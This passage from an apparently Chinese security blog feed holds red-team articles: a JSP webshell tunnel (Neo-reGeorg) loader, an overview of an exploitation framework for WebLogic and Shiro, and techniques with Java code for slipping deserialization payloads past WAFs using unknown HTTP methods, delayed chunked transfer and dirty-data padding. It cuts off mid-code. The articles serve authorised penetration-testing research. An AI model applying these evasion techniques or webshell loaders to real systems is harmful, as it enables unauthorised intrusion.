class="string">"X-TARGET"</span>,<span class="comment">//10</span></span><br><span class="line">            <span class="string">"X-REDIRECTURL"</span>,<span class="comment">//11</span></span><br><span class="line">            <span class="string">"FAIL"</span>,<span class="comment">//12</span></span><br><span class="line">            <span class="string">"Georg says, 'All seems fine'"</span>,<span class="comment">//13</span></span><br><span class="line">            <span class="string">"Failed creating socket"</span>,<span class="comment">//14</span></span><br><span class="line">            <span class="string">"Failed connecting to target"</span>,<span class="comment">//15</span></span><br><span class="line">            <span class="string">"OK"</span>,<span class="comment">//16</span></span><br><span class="line">            <span class="string">"Failed writing socket"</span>,<span class="comment">//17</span></span><br><span class="line">            <span class="string">"CONNECT"</span>,<span class="comment">//18</span></span><br><span class="line">            <span class="string">"DISCONNECT"</span>,<span class="comment">//19</span></span><br><span class="line">            <span class="string">"READ"</span>,<span class="comment">//20</span></span><br><span class="line">            <span class="string">"FORWARD"</span>,<span class="comment">//21</span></span><br><span class="line">            <span class="string">"Failed reading from socket"</span>,<span class="comment">//22</span></span><br><span class="line">            <span class="string">"No more running, close now"</span>,<span class="comment">//23</span></span><br><span class="line">            <span class="string">"POST request read filed"</span>,<span class="comment">//24</span></span><br><span class="line">            <span class="string">"Intranet forwarding failed"</span><span class="comment">//25</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(application.getAttribute(<span class="string">"u"</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">        application.getAttribute(<span class="string">"u"</span>).equals(args);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;.....&#125; <span class="comment">// NeoreGeorg.class字节码</span></span><br><span class="line">        Class clazz = <span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(classBytes);</span><br><span class="line">        application.setAttribute(<span class="string">"u"</span>,clazz.newInstance());</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>经过测试在各个中间件下稳定运行，顺手给L-codes师傅一个<a href="https://github.com/L-codes/Neo-reGeorg/pull/42" target="_blank" rel="noopener">pr</a>。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>其实这个方法可以使用很多jsp脚本的改造，比如内存马注入jsp，jsp大马，蚁剑一句话木马等等。大家可以照猫画虎，自行修改。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高危漏洞狙击框架:woodpecker-framework</title>
      <link href="/articles/2021/woodpecker-framework-introduce/"/>
      <url>/articles/2021/woodpecker-framework-introduce/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>woodpecker-framework是一款高危漏洞综合利用框架，目的是可以狙击高危漏洞，拿到权限！其设计是由我在日常红队外围打点经验抽象得来。它的每个模块和外围打点的主要流程是一一对应的。</p><p>比如遇到一个具体的外围应用，渗透测试的流程是：</p><ol><li>探测当前应用所有攻击面和风险点 （信息探测模块）</li><li>使用poc探测漏洞是否存在 (精准检测模块)</li><li>通过exp拿下webshell (深度利用模块)</li><li>遇到奇葩环境漏洞环境自动化无法打死，需要人工生成payload （荷载生成模块）</li><li>人工构造payload时经常需要做一些常规操作，比如把Class变成BCEL编码，runtime.exec命令变形等等 （辅助模块）</li></ol><p>下面围绕weblogic和shiro这两个高频漏洞应用来详细介绍每个模块。</p><h2 id="0x02-信息探测模块（InfoDetector）"><a href="#0x02-信息探测模块（InfoDetector）" class="headerlink" title="0x02 信息探测模块（InfoDetector）"></a>0x02 信息探测模块（InfoDetector）</h2><p><strong>信息探测模块的任务是寻找当前应用最薄弱的点。</strong> 显然有用的信息是判断的重要依据。这里探测的信息不是什么操作系，中间件，cms之类的指纹识别。而是针对具体应用的攻击面和风险点的探测，比如weblogic就会探测如下​信息。​</p><ol><li>weblogic是那个版本</li><li>协议是否开启t3/iiop协议</li><li>web端口是否可以访问到console，wls，async之类的组件</li></ol><p><img src="/articles/2021/woodpecker-framework-introduce/weblogic-info-detector.png" alt></p><p>顺便值得一提的是，我们探测t3/iiop协议的时候，还需要探测它们是否被设置为禁止连接，不然探测出open也是无法利用的。如上图的t3开启了但是配置了如下过滤。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weblogic.security.net.ConnectionFilterImpl</span><br><span class="line">0.0.0.0/0 * * deny t3 t3s</span><br></pre></td></tr></table></figure><p>这些信息有什么用呢？当然是让我们知道面前这个weblogic的薄弱点在哪里，后续攻击的计划应该是:t3和iiop系列漏洞不用测试了，wls-wsat组件的xmldecoder反序列化漏洞可以看看。</p><h2 id="0x03-精准检测模块-POC"><a href="#0x03-精准检测模块-POC" class="headerlink" title="0x03 精准检测模块(POC)"></a>0x03 精准检测模块(POC)</h2><p><strong>精准检测模块的任务是使用poc去判断漏洞是否存在。</strong> 显然精准是这个模块关注的问题，我们的原则是误报可以原谅，但是漏报坚决杜绝。</p><p>那现实如此复杂的漏洞环境，怎么实现精准检查呢？woodpecker插件的检测原则是尽可能的实现以下所有检测方案。</p><ol><li>回显检测</li><li>dnslog检测</li><li>间接检查</li><li>写文件检测</li><li>触发补丁检测</li><li>延时检测</li><li>特定特征检测</li><li>….</li></ol><p><img src="/articles/2021/woodpecker-framework-introduce/cve-2020-148823.png" alt></p><p>这里我细说下<code>3</code>,<code>5</code>和<code>7</code>这三个方案，其他方案​顾名思义。​</p><p><code>间接检测</code>是不通过直接触发漏洞来检测，而是通过其他方面间接来验证。举2个例子，shiro key的检测由开始的通过回显，dnslog之类的直接检测变成了现在统计rememberMe个数。weblogic漏洞检测则可通过下载黑明单class来验证是否被修复。这些方法很巧妙，在漏检中有四两拨千斤的作用。</p><ul><li><a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ" target="_blank" rel="noopener">一种另类的 shiro 检测方式</a></li><li><a href="https://mp.weixin.qq.com/s/tgQO9ILHudfkkOzeahICTg" target="_blank" rel="noopener">红蓝必备 你需要了解的weblogic攻击手法</a></li></ul><p><code>触发补丁检测</code>就是提交可触发补丁的payload，然后看是否拦截来确定漏洞是否修复。比如CVE-2019-2725我们就可以发送带<class>标签的payload，若如下提示非法标签说明漏洞修复了。</class></p><p><img src="/articles/2021/woodpecker-framework-introduce/cve-2019-2725.png" alt></p><p><code>特定特征检测</code>就是通过respone的某些特征可以知道漏洞是否修复，比如CVE-2020-14882/3漏洞修复后的响应如下,那咱们就可以通过repsoen状态码为<code>500</code>,返回包中存在<code>The server encountered an unexpected condition which prevented it from fulfilling the request.</code>提示来判断。</p><p><img src="/articles/2021/woodpecker-framework-introduce/cve-2020-148823-fixbug.png" alt></p><h2 id="0x04-深度利用模块-Exploit"><a href="#0x04-深度利用模块-Exploit" class="headerlink" title="0x04 深度利用模块(Exploit)"></a>0x04 深度利用模块(Exploit)</h2><p><strong>深度利用模块的任务是发挥漏洞的最大利用价值</strong>。比如一个RCE可以干的事情很多，命令执行，写文件，读文件，反弹shell，注入内存马，开启bindshell等等。不过最后我梳理了下，很多功能都是有交集的，比如反弹shell可以通过命令执行来反弹，读文件可以通过webshell来读。所以在红队行动中，真正对我们有用的一般是三个功能，woodpecker插件编写的原则上要求深度利用模块必须实现这3个功能，并保证稳定性。</p><ol><li>写文件</li><li>命令回显</li><li>注入内存马</li></ol><p><img src="/articles/2021/woodpecker-framework-introduce/cve-2020-148823-injectmemshell.png" alt></p><h2 id="0x05-荷载生成模块-Payload-generator"><a href="#0x05-荷载生成模块-Payload-generator" class="headerlink" title="0x05 荷载生成模块(Payload generator)"></a>0x05 荷载生成模块(Payload generator)</h2><p><strong>荷载生成模块的任务是帮助红队人员快速生成自定义payload。</strong> 自动化并不能解决所有问题，当遇到奇葩环境时就需要人工介入。比如当shiro漏洞遇到未知中间件时，可能无法回显也无法注入内存马，这时就需要人工构造payload了。但是每次都要先生成序列化数据，设置key，选择加密模式，非常浪费时间。而woodpecker shiro漏洞插件的荷载生成模块可以一键生成。</p><p><img src="/articles/2021/woodpecker-framework-introduce/shiro-payload-generator.png" alt></p><h2 id="0x06-辅助模块-Helper"><a href="#0x06-辅助模块-Helper" class="headerlink" title="0x06 辅助模块(Helper)"></a>0x06 辅助模块(Helper)</h2><p><strong>该模块的任务是将漏洞检测和利用中经常要进行的操作自动化，节省时间。</strong></p><p>比如在java命令执行漏洞中无法使用带有管道符的命令，需要我们去转换下命令。当然有<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">Jackson_T</a>这样的在线网站，这里我编写成了<a href="https://github.com/woodpecker-appstore/runtime-exec-encoder" target="_blank" rel="noopener">本地插件</a>。</p><p><img src="/articles/2021/woodpecker-framework-introduce/runtime.exec.png" alt></p><p>同时如果想通过命令执行漏洞写一个shell的话，往往需要转义下，这个过程也是比较繁琐的。可以使用<a href="https://github.com/woodpecker-appstore/EchoToFileConverter" target="_blank" rel="noopener">EchoToFileConverter</a>插件来解决。</p><p><img src="/articles/2021/woodpecker-framework-introduce/echo-to-file.png" alt></p><h2 id="0x07-最后的话"><a href="#0x07-最后的话" class="headerlink" title="0x07 最后的话"></a>0x07 最后的话</h2><p>如果你比较认同这样的设计，并有能力编写插件。欢迎到github提交pr或者插件。</p><ul><li><a href="https://woodpecker.gv7.me" target="_blank" rel="noopener">框架主页</a></li><li><a href="https://github.com/woodpecker-framework" target="_blank" rel="noopener">框架仓库</a></li><li><a href="http://github.com/woodpecker-appstore" target="_blank" rel="noopener">插件仓库</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> woodpecker-framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro反序列化绕WAF之未知HTTP请求方法</title>
      <link href="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/"/>
      <url>/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>当下WAF对shiro的防护，确实比较严格。对rememberMe的长度进行限制，甚至解密payload检查反序列化class。本周我遇到一个场景，就是这种情况。使用之前的方法<code>rememberMe</code>=<code>加密payload</code>+<code>==垃圾数据</code>也失败了，<a href="https://mp.weixin.qq.com/s/P5h9_K4YcvsrU4tsdHsJdQ" target="_blank" rel="noopener">这个方法</a>之前有大佬分享过，我就不再赘述了。我最终使用<code>未知HTTP请求方法</code>解决战斗。</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/blocked-by-waf.png" alt="被WAF拦截"></p><h2 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h2><p>当时我的思考是shiro的payload在header上，如何修改request header可以导致waf解析不出来，但是后端中间件正常解析呢？</p><p>第一步，先构造出先绕WAF，哪怕改成不合法的数据包。<br>第二步，在绕WAF的数据包基础上修正，让后端中间件可以解析。</p><p>我把被拦截的包发送的repeater模块,尝试切换http版本，添加垃圾header头等等方法均没绕过。在修改GET方法为<code>XXX</code>这样的未知HTTP请求方法时,发现WAF不在拦截，但是后端报错了。</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/bypass-waf.png" alt="未知HTTP请求方法可以过WAF"></p><p>接下来验证下后端是否真正处理了rememberMe。我先请求去掉rememberMe，response对应的rememberMe消失了</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/test-for-del-rememberme.png" alt="删除rememberMe进行测试"></p><p>然后再加上rememberMe,repseone的remeberMe又回来了。这说明后端正常处理rememberMe，这么绕WAF没问题！</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/test-for-add-rememberme.png" alt="添加rememberMe进行测试"></p><p>最后将之前注入内存webshell的payload修改下请求方法，成功下Web权限。</p><h2 id="0x03-原理"><a href="#0x03-原理" class="headerlink" title="0x03 原理"></a>0x03 原理</h2><p>方法简单粗暴，不难推断WAF是通过正常的http方法识别HTTP数据包的。但是为何后端中间件依然能拿到rememberMe的结果呢？</p><p>于是我在本地代码<code>org.apache.shiro.web.mgt.CookieRememberMeManager#getRememberedSerializedIdentity</code>处下了断点。</p><p><img src="/articles/2021/shiro-deserialization-bypasses-waf-through-unknown-http-method/debug-shiro-rememberme.png" alt="调试shiro rememberMe流程"></p><p>通过<code>XXX方法</code>发送数据包，调试发现<code>request.getCookies</code>可以获取到<code>rememberMe</code>值，而且如下方法均可正常使用。说明未知HTTP请求方法不影响各类参数的读取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">request.getHeader</span><br><span class="line">request.getParameter // 只能读url提交的参数，body提交的没有解析</span><br><span class="line">request.getInputStream // 读request body</span><br></pre></td></tr></table></figure><p>那对三大组件的调用是否有影响呢？继续翻阅Tomcat源码，我发现Listener被调用是受<code>行为事件</code>影响，Filter是受<code>请求路径</code>影响，而Servlet是受<code>请求路径</code>和<code>HTTP请求方法</code>影响。一旦遇到未知方法，Servlet不再进入业务代码，直接返回一个<code>http.method_not_implemented</code>报错。具体代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//javax.servlet.http.HttpServlet#service</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">    String method = req.getMethod();</span><br><span class="line">    <span class="keyword">long</span> lastModified;</span><br><span class="line">    <span class="keyword">if</span> (method.equals(<span class="string">"GET"</span>)) &#123;</span><br><span class="line">        .....</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"HEAD"</span>)) &#123;</span><br><span class="line">        lastModified = <span class="keyword">this</span>.getLastModified(req);</span><br><span class="line">        <span class="keyword">this</span>.maybeSetLastModified(resp, lastModified);</span><br><span class="line">        <span class="keyword">this</span>.doHead(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"POST"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPost(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"PUT"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doPut(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"DELETE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doDelete(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"OPTIONS"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doOptions(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (method.equals(<span class="string">"TRACE"</span>)) &#123;</span><br><span class="line">        <span class="keyword">this</span>.doTrace(req, resp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String errMsg = lStrings.getString(<span class="string">"http.method_not_implemented"</span>);</span><br><span class="line">        Object[] errArgs = <span class="keyword">new</span> Object[]&#123;method&#125;;</span><br><span class="line">        errMsg = MessageFormat.format(errMsg, errArgs);</span><br><span class="line">        resp.sendError(<span class="number">501</span>, errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以得到一个结论就是 <strong>未知Http方法名绕WAF这个姿势，可以使用在Filter和Listener层出现的漏洞，同时WAF不解析的情况</strong>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 绕WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化数据绕WAF之延时分块传输</title>
      <link href="/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/"/>
      <url>/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p><code>chunked-coding-converter</code>在0.2.1以及之前版本是不支持对二进制数据进行分块的。这个问题实验室的<code>darkr4y</code>师傅今年3月份的时候就已经反馈了多次，由于懒癌在身一直没有更新。直到我自己遇到一个站点，<a href="https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/">反序列化带大量脏数据</a>没有绕成功，于是又想起了分块传输。花了一点时间让插件支持了二进制数据，然而这样依然被拦截了！ </p><p><img src="/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/blocked-by-waf.png" alt="直接分块传输被WAF拦截"></p><p>这也在意料之中，分块传输被公开已经有两年之久，很多WAF已经支持检测。那有没有办法让这个姿势重振往日雄风呢？</p><h2 id="0x02-延时分块"><a href="#0x02-延时分块" class="headerlink" title="0x02 延时分块"></a>0x02 延时分块</h2><p>通过测试，发现WAF一般是如下应对分块传输的。</p><ol><li>发现数据包是分块传输，启动分块传输线程进行接收</li><li>分块传输线程不断接收客户端传来的分块，直到接收到<code>0\r\n\r\n</code></li><li>将所有分块合并，并检测合并之后的内容。</li></ol><p>当时和<code>darkr4y</code>师傅交流时，我们曾做过一个设想，<strong>在上一块传输完成后，sleep一段时间，再发送下一块。</strong> 目的是在2阶段延长WAF分块传输线程的等待时间，消耗WAF性能。这时有没有可能WAF为自身性能和为业务让步考虑，而放弃等待所有分块发送完呢？ 。这次正好遇到适合的环境来验证一下想法。</p><p><img src="/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/sleep-chunked-bypass-workflow.png" alt="延时分块传输绕WAF流程"></p><p>当然了，我们块与块之间发送的间隔时间必须要小于后端中间件的<code>post timeout</code>,Tomcat默认是20s,weblogic是30s。</p><h2 id="0x03-编码实现"><a href="#0x03-编码实现" class="headerlink" title="0x03 编码实现"></a>0x03 编码实现</h2><p>为了加大WAF的识别难度，我们可以考虑以下3点。</p><ol><li>延时时间随机化</li><li>分块长度随机化</li><li>垃圾注释内容与长度随机化[可选]</li></ol><p>首先我们需要对原始request header进行处理。需要把<code>Content-Length</code>删除，分块传输不需要发送body长度，然后加上<code>Transfer-Encoding: chunked</code>头。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers.remove(<span class="string">"Content-Length"</span>);</span><br><span class="line">headers.put(<span class="string">"Transfer-Encoding"</span>,<span class="string">"chunked"</span>);</span><br></pre></td></tr></table></figure><p>其实调用<code>HttpURLConnection.setChunkedStreamingMode(int chunkedLen)</code>就可以实现分块发包。不过这个接口只能设置固定分块长度，而且无法直接控制分块时间间隔。于是我打算用socket来模拟发送http/https分块传输包，这样要灵活的多。以下是实现的简化代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.连接目标服务器</span></span><br><span class="line">Socket socket = socket.connect(<span class="keyword">new</span> InetSocketAddress(host, port));</span><br><span class="line">OutputStream osw = socket.getOutputStream();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.发送request header</span></span><br><span class="line">osw.write(reqHeader);</span><br><span class="line">osw.flush();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.随机分块和随机延时发送request body</span></span><br><span class="line">ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(reqBody);</span><br><span class="line"><span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[Util.getRandom(minChunkedLen,maxChunkedLen)];</span><br><span class="line"><span class="keyword">while</span> (byteArrayInputStream.read(buffer) != -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">// 3.1发送分块长度</span></span><br><span class="line">        <span class="keyword">final</span> String chunkedLen = Util.decimalToHex(buffer.length) + <span class="string">"\r\n"</span>;</span><br><span class="line">        osw.write(chunkedLen.getBytes());</span><br><span class="line">        chunkeInfoEntity.setChunkedLen(buffer.length);</span><br><span class="line">        osw.flush();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.2发送分块内容</span></span><br><span class="line">        <span class="keyword">byte</span>[] chunked = Transfer.joinByteArray(buffer, <span class="string">"\r\n"</span>.getBytes());</span><br><span class="line">        osw.write(chunked);</span><br><span class="line">        osw.flush();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3.3延时</span></span><br><span class="line">        <span class="keyword">int</span> sleeptime = Util.getRandom(minSleepTime,maxSleepTime);</span><br><span class="line">        Thread.sleep(sleeptime);</span><br><span class="line">    </span><br><span class="line">        buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[Util.getRandom(minChunkedLen,maxChunkedLen)]; <span class="comment">// 获取新的buffer长度</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.发送完毕</span></span><br><span class="line">osw.write(<span class="string">"0\r\n\r\n"</span>.getBytes());</span><br><span class="line">osw.flush();</span><br><span class="line"><span class="keyword">byte</span>[] result = readFullHttpResponse(socket.getInputStream());</span><br></pre></td></tr></table></figure><p>为了方便日后使用，我给<a href="https://github.com/c0ny1/chunked-coding-converter" target="_blank" rel="noopener">chunked-coding-converter</a>插件添加了<code>sleep chunked sender</code>，并添加很多细节功能，比如预估分块数量范围和延时范围，显示每一块发送的内容，长度，延时时间以及发送状态等等。</p><p>这里我直接使用最新版本，将被拦截的数据分成<code>218块</code>，共延时<code>1分46秒</code>发送，最终成功绕过WAF。</p><p><img src="/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/bypass-through-sleep-chunked.png" alt="延时分块传输成功绕过WAF"></p><h2 id="0x04-一些零碎"><a href="#0x04-一些零碎" class="headerlink" title="0x04 一些零碎"></a>0x04 一些零碎</h2><p>最后列一点边边角角的东西，当餐后”甜点“，需要请自取。</p><ol><li>只有HTTP/1.1支持分块传输</li><li>POST包都支持分块，不局限仅仅于反序列化和上传包</li><li>Transfer-Encoding: chunked大小写不敏感</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> 绕WAF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化数据绕WAF之加大量脏数据</title>
      <link href="/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/"/>
      <url>/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>前几周有个同事发给我一个授权的站点,需要拿下webshell权限。发现存在Java反序列化漏洞，但是有WAF,ysoserial生成的序列化数据直接就被拦截了。</p><p><img src="/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/blocked-by-waf.png" alt="序列化数据被WAF拦截"></p><p>绕WAF的前提自然是先摸清WAF拦截的规则。我先是把序列化头<code>aced0005</code>删掉，发现还是被拦截了,看来WAF没开启无脑的hw模式。</p><p>接着将序列化数据当中的class名破坏，发现不再拦截了。说明WAF应该是把gadget的class加入了规则。</p><p>考虑到大多数WAF受限于性能影响，当request足够大时，WAF可能为因为性能原因作出让步，超出检查长度的内容，将不会被检查。于是我在序列化头后加了<code>50000</code>个<code>x</code>字符，发现WAf不再拦截，证明这个思路可行！</p><p>这样虽然绕过了WAF，但新的问题也来了。序列化数据是二进制数据，直接手工在burp里加入垃圾数据破坏了序列化数据的结构，后端代码并没有反序列化成功。接下来继续解决这个问题。</p><h2 id="0x02-如何给序列化数据加脏数据？"><a href="#0x02-如何给序列化数据加脏数据？" class="headerlink" title="0x02 如何给序列化数据加脏数据？"></a>0x02 如何给序列化数据加脏数据？</h2><p>我的思路是需要找到一个class可以序列化，它可以把我们的<code>脏数据对象</code>和<code>ysoserial gadget对象</code>一起包裹起来。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">50000</span>]&#123;<span class="number">12</span>,<span class="number">12</span>,<span class="number">12</span>....&#125; <span class="comment">//垃圾数据</span></span><br><span class="line">......</span><br><span class="line">ysoserial gadget object</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们要找的class，<strong>第一需要实现<code>java.io.Serializable</code>接口，第二可以存储任意对象</strong> 。这么看来集合类型就非常符合我们的需求。</p><ol><li>ArrayList</li><li>LinkedList</li><li>HashMap</li><li>LinkedHashMap</li><li>TreeMap</li><li>……</li></ol><p>伪代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Object&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Object&gt;();</span><br><span class="line">arrayList.add(dirtyData); <span class="comment">// 脏数据</span></span><br><span class="line">arrayList.add(gadget);<span class="comment">// gadget</span></span><br><span class="line"><span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/bypass-waf.ser"</span>)).writeObject(arrayList);</span><br></pre></td></tr></table></figure><h2 id="0x03-改造ysoserial"><a href="#0x03-改造ysoserial" class="headerlink" title="0x03 改造ysoserial"></a>0x03 改造ysoserial</h2><p>为了方便日后使用，我们可以改造下ysoserial，让所有gadget都支持添加大量垃圾数据。大致的流程调用是，构造函数传入gadget对象以及垃圾数据长度，然后调用doWrap方法随机创建一个集合类型把随机生成的脏数据和gadget对象存储起来，最终序列化该对象即可拿到bypass WAF的序列化数据。具体实现参考如下代码和注释。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DirtyDataWrapper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> dirtyDataSize; <span class="comment">//脏数据大小</span></span><br><span class="line">    <span class="keyword">private</span> String dirtyData; <span 